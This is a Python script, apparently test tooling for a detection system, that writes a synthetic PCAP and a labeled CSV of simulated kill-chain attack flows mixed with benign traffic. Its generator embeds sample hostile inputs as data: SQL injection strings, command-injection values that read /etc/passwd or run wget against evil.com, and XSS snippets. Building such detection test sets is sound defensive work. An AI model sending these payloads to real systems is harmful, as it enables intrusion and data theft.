#!/usr/bin/env python3
"""
Generate multi-agent chain attack validation PCAP.

Creates attack sequences designed to test cascading agent failures:
  - 20 attack chains from unique source IPs
  - Each chain follows: Recon -> Exploit -> Persistence -> Lateral -> Exfil
  - Mixed with 40% benign traffic for noise
  - 15,000 total flows, ~30-50MB

Outputs:
  multiagent_validation.pcap
  multiagent_ground_truth.csv (with chain_id column)

Usage:
  python generate_multiagent_pcap.py [--chains 20] [--flows 15000]
"""
import argparse, csv, os, random, struct, time as _time
import dpkt

random.seed(2026)

# ── Reuse helpers from generate_validation_pcap ──────────────────────────────
ATTACKER_NETS = ["192.168.99.", "198.51.100.", "203.0.113."]
TARGET_NETS = ["10.0.1.", "10.0.2.", "10.50.1.", "172.16.1."]
BENIGN_NETS = ["192.168.1.", "192.168.2.", "10.0.1."]


def rand_ip(nets):
    return random.choice(nets) + str(random.randint(1, 254))


def ip_to_bytes(ip_str):
    return bytes(int(o) for o in ip_str.split('.'))


def make_tcp(src, dst, sport, dport, flags, payload=b''):
    tcp = dpkt.tcp.TCP(sport=sport, dport=dport, flags=flags,
                       seq=random.randint(0, 2**31), data=payload)
    ip = dpkt.ip.IP(src=ip_to_bytes(src), dst=ip_to_bytes(dst),
                    p=dpkt.ip.IP_PROTO_TCP, data=tcp, len=20 + len(bytes(tcp)))
    ip.id = random.randint(0, 65535)
    return bytes(ip)


def make_udp(src, dst, sport, dport, payload=b''):
    udp = dpkt.udp.UDP(sport=sport, dport=dport, data=payload)
    udp.ulen = 8 + len(payload)
    ip = dpkt.ip.IP(src=ip_to_bytes(src), dst=ip_to_bytes(dst),
                    p=dpkt.ip.IP_PROTO_UDP, data=udp, len=20 + len(bytes(udp)))
    ip.id = random.randint(0, 65535)
    return bytes(ip)


def make_icmp(src, dst, icmp_type=8, payload=b''):
    icmp = dpkt.icmp.ICMP(type=icmp_type, data=dpkt.icmp.ICMP.Echo(
        id=random.randint(0, 65535), seq=random.randint(0, 65535), data=payload))
    ip = dpkt.ip.IP(src=ip_to_bytes(src), dst=ip_to_bytes(dst),
                    p=dpkt.ip.IP_PROTO_ICMP, data=icmp, len=20 + len(bytes(icmp)))
    return bytes(ip)


def rp(lo=100, hi=1400):
    """Random payload."""
    return random.randbytes(random.randint(lo, hi))


def rport():
    return random.randint(1024, 65535)


SYN = dpkt.tcp.TH_SYN
ACK = dpkt.tcp.TH_ACK
PSH_ACK = dpkt.tcp.TH_PUSH | dpkt.tcp.TH_ACK
RST = dpkt.tcp.TH_RST

# ── Kill chain stages ────────────────────────────────────────────────────────
# Each chain progresses: Recon -> Initial Access -> Execution -> Persistence
#                        -> Lateral Movement -> Impact/Exfil

KILL_CHAIN = [
    # Stage 1: Reconnaissance
    ["Recon-PingSweep", "Recon-PortScan"],
    # Stage 2: Initial Access
    ["BruteForce-SSH", "WebAttack-SQLi", "BruteForce-FTP"],
    # Stage 3: Execution
    ["WebAttack-CommandInjection", "WebAttack-XSS"],
    # Stage 4: Persistence
    ["Malware-Backdoor"],
    # Stage 5: Lateral Movement
    ["Spoofing-IP", "Spoofing-ARP"],
    # Stage 6: Impact
    ["DDoS-TCP_Flood", "Malware-Ransomware", "DDoS-SYN_Flood"],
]


def gen_chain_flow(label, src, dst, ts_base):
    """Generate packets for a single flow in a chain with fixed src/dst."""
    pkts = []
    n = random.randint(5, 15)
    ts = ts_base

    if label in ("Recon-PingSweep",):
        for _ in range(n):
            ts += random.uniform(0.001, 0.05)
            pkts.append((ts, make_icmp(src, dst, 8, rp(64, 1000))))

    elif label in ("Recon-PortScan",):
        for i in range(n):
            ts += random.uniform(0.01, 0.1)
            pkts.append((ts, make_tcp(src, dst, rport(), 1 + i * random.randint(1, 100), SYN, b'')))

    elif "BruteForce" in label:
        port_map = {"BruteForce-SSH": 22, "BruteForce-FTP": 21}
        dp = port_map.get(label, 22)
        for _ in range(n):
            ts += random.uniform(0.1, 1.0)
            pay = f"USER admin\r\nPASS {random.randbytes(8).hex()}\r\n".encode()
            pkts.append((ts, make_tcp(src, dst, rport(), dp, PSH_ACK, pay)))

    elif label == "WebAttack-SQLi":
        sqls = [b"' OR 1=1--", b"'; DROP TABLE users;--",
                b"' UNION SELECT * FROM passwords--", b"1' AND SLEEP(5)--"]
        for _ in range(n):
            ts += random.uniform(0.5, 2.0)
            s = random.choice(sqls)
            req = f"GET /search?q={s.decode(errors='replace')} HTTP/1.1\r\nHost: t\r\n\r\n".encode()
            pkts.append((ts, make_tcp(src, dst, rport(), 80, PSH_ACK, req)))

    elif label == "WebAttack-CommandInjection":
        cmds = [b"; cat /etc/passwd", b"| ls -la /", b"&& wget http://evil.com/sh", b"`id`"]
        for _ in range(n):
            ts += random.uniform(0.5, 2.0)
            c = random.choice(cmds)
            req = f"GET /api/exec?cmd={c.decode(errors='replace')} HTTP/1.1\r\n\r\n".encode()
            pkts.append((ts, make_tcp(src, dst, rport(), 80, PSH_ACK, req)))

    elif label == "WebAttack-XSS":
        xsses = [b"<script>alert('XSS')</script>", b"<img src=x onerror=alert(1)>"]
        for _ in range(n):
            ts += random.uniform(0.5, 2.0)
            x = random.choice(xsses)
            req = f"POST /comment HTTP/1.1\r\nHost: t\r\nContent-Length: {len(x)}\r\n\r\n".encode() + x
            pkts.append((ts, make_tcp(src, dst, rport(), 80, PSH_ACK, req)))

    elif label == "Malware-Backdoor":
        # Reverse connection: dst calls back to src (attacker)
        for _ in range(n):
            ts += random.uniform(10.0, 60.0)
            pkts.append((ts, make_tcp(dst, src, rport(),
                         random.choice([4444, 5555, 8888, 1337]), PSH_ACK, rp(50, 300))))

    elif label == "Spoofing-IP":
        for _ in range(n):
            ts += random.uniform(0.01, 0.1)
            pkts.append((ts, make_tcp(src, dst, rport(), random.choice([80, 443]), ACK, rp(100, 500))))

    elif label == "Spoofing-ARP":
        for _ in range(n):
            ts += random.uniform(0.5, 2.0)
            pkts.append((ts, make_udp(src, dst, 68, 67, b'\x00\x01' + rp(28, 46))))

    elif "DDoS-TCP" in label or "DDoS-SYN" in label:
        fl = SYN if "SYN" in label else SYN | ACK
        dp = random.choice([80, 443, 8080])
        for _ in range(n):
            ts += random.uniform(0.001, 0.01)
            pkts.append((ts, make_tcp(src, dst, rport(), dp, fl, rp(60, 200))))

    elif label == "Malware-Ransomware":
        for _ in range(n):
            ts += random.uniform(0.01, 0.1)
            pkts.append((ts, make_tcp(src, dst, rport(), 445, PSH_ACK, rp(800, 1400))))

    else:  # fallback
        for _ in range(n):
            ts += random.uniform(0.01, 0.5)
            pkts.append((ts, make_tcp(src, dst, rport(), 80, ACK, rp(200, 1000))))

    return pkts


def gen_benign_flow(ts_base):
    """Generate a benign traffic flow."""
    pkts = []
    n = random.randint(5, 20)
    ts = ts_base
    src = rand_ip(BENIGN_NETS)
    dst = rand_ip(TARGET_NETS)
    sp, dp = rport(), random.choice([80, 443, 53, 22, 8080])
    for _ in range(n):
        ts += random.uniform(0.01, 0.5)
        pkts.append((ts, make_tcp(src, dst, sp, dp, ACK, rp(200, 1200))))
    return src, dst, pkts


def main():
    ap = argparse.ArgumentParser(description="Generate multi-agent chain attack PCAP")
    ap.add_argument("--chains", type=int, default=20, help="Number of attack chains (default: 20)")
    ap.add_argument("--flows", type=int, default=15000, help="Total flows including benign (default: 15000)")
    ap.add_argument("--labeled-ratio", type=float, default=0.6, help="Labeled fraction (default: 0.6)")
    args = ap.parse_args()

    output_dir = os.path.dirname(os.path.abspath(__file__))
    pcap_path = os.path.join(output_dir, "multiagent_validation.pcap")
    csv_path = os.path.join(output_dir, "multiagent_ground_truth.csv")

    # Build attack chains: each chain = unique src IP -> same target
    chains = []
    for chain_id in range(1, args.chains + 1):
        src = f"198.51.{100 + chain_id}.{random.randint(1, 254)}"
        dst = rand_ip(TARGET_NETS)
        # Pick 5-8 stages from the kill chain (always include stage 1 & 6)
        n_steps = random.randint(5, min(8, len(KILL_CHAIN) + 2))
        steps = []
        for stage_idx, stage_options in enumerate(KILL_CHAIN):
            steps.append(random.choice(stage_options))
            if len(steps) >= n_steps:
                break
        # Ensure we always end with an impact stage if not already there
        if steps[-1] not in KILL_CHAIN[-1]:
            steps.append(random.choice(KILL_CHAIN[-1]))
        chains.append((chain_id, src, dst, steps))

    # Calculate attack flows and benign flows
    total_attack_flows = sum(len(steps) for _, _, _, steps in chains)
    benign_target = max(0, args.flows - total_attack_flows)

    print(f"Generating {args.chains} attack chains with {total_attack_flows} attack flows")
    print(f"Adding {benign_target} benign flows for noise ({benign_target / args.flows * 100:.0f}%)")
    print(f"Total: {total_attack_flows + benign_target} flows -> {pcap_path}\n")

    writer = dpkt.pcap.Writer(open(pcap_path, 'wb'), linktype=dpkt.pcap.DLT_RAW)
    csv_f = open(csv_path, 'w', newline='')
    cw = csv.writer(csv_f)
    cw.writerow(['flow_id', 'src_ip', 'dst_ip', 'label', 'chain_id', 'step_in_chain', 'is_labeled'])

    ts = _time.time() - args.flows * 0.5
    total_bytes = 0
    flow_idx = 0

    # Interleave attack chain flows with benign traffic
    # Build a schedule: list of (ts_offset, type, data)
    schedule = []

    # Add attack chain flows
    for chain_id, src, dst, steps in chains:
        chain_ts = ts + random.uniform(0, args.flows * 0.3)
        for step_idx, label in enumerate(steps):
            schedule.append((chain_ts, 'attack', chain_id, src, dst, label, step_idx + 1))
            chain_ts += random.uniform(5.0, 60.0)  # time between stages

    # Add benign flows
    for _ in range(benign_target):
        benign_ts = ts + random.uniform(0, args.flows * 0.4)
        schedule.append((benign_ts, 'benign', 0, None, None, 'Benign', 0))

    # Sort by timestamp
    schedule.sort(key=lambda x: x[0])

    class_counts = {}
    labeled_count = 0

    for entry in schedule:
        entry_ts, flow_type = entry[0], entry[1]
        chain_id, src, dst, label, step_in_chain = entry[2], entry[3], entry[4], entry[5], entry[6]
        flow_idx += 1
        fid = f"F{flow_idx:06d}"

        if flow_type == 'benign':
            src, dst, pkts = gen_benign_flow(entry_ts)
        else:
            pkts = gen_chain_flow(label, src, dst, entry_ts)

        is_labeled = random.random() < args.labeled_ratio
        if is_labeled:
            labeled_count += 1

        for pkt_ts, pkt_data in pkts:
            writer.writepkt(pkt_data, pkt_ts)
            total_bytes += len(pkt_data)

        cw.writerow([fid, src, dst, label, chain_id, step_in_chain, is_labeled])
        class_counts[label] = class_counts.get(label, 0) + 1

        if flow_idx % 2000 == 0:
            print(f"  [{flow_idx:,}/{len(schedule):,}] {total_bytes / (1024*1024):.1f} MB generated...")

    writer.close()
    csv_f.close()

    pcap_mb = os.path.getsize(pcap_path) / (1024 * 1024)
    csv_mb = os.path.getsize(csv_path) / (1024 * 1024)
    total_flows = flow_idx
    unlabeled = total_flows - labeled_count

    print(f"\n{'=' * 60}")
    print(f"Generated: {pcap_path} ({pcap_mb:.1f} MB)")
    print(f"Ground truth: {csv_path} ({csv_mb:.2f} MB)")
    print(f"Total flows: {total_flows:,}")
    print(f"Attack chains: {args.chains} (from {total_attack_flows} attack flows)")
    print(f"Benign flows: {benign_target:,}")
    print(f"Labeled: {labeled_count:,} ({labeled_count/total_flows:.1%})")
    print(f"Unlabeled: {unlabeled:,} ({unlabeled/total_flows:.1%})")
    print(f"\nClass distribution:")
    for lbl, cnt in sorted(class_counts.items(), key=lambda x: -x[1]):
        print(f"  {lbl:35s} {cnt:6,} ({cnt/total_flows*100:5.1f}%)")
    print(f"\nKill chain stages per chain:")
    for chain_id, src, dst, steps in chains[:5]:
        print(f"  Chain {chain_id:2d}: {src:20s} -> {dst:15s} | {' -> '.join(steps)}")
    if args.chains > 5:
        print(f"  ... and {args.chains - 5} more chains")
    print(f"{'=' * 60}")


if __name__ == '__main__':
    main()
